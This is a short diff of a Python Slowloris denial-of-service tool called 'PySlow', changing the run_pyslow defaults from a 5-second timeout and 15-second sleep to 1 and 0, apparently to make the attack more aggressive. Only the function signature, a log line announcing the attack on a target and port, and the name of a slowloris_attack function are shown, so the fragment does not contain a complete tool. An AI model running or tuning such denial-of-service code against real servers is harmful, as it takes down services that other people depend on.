@@ -27,7 +27,7 @@ def slowloris_attack(target, port, timeout, sleep):
     except Exception:
         return None
 
-def run_pyslow(target, port=80, threads=100, timeout=5, sleep=15):
+def run_pyslow(target, port=80, threads=100, timeout=1, sleep=0):
     logging.info(f"[+] Starting PySlow attack on {target}:{port} with {threads} threads")
     socket_list = []
 
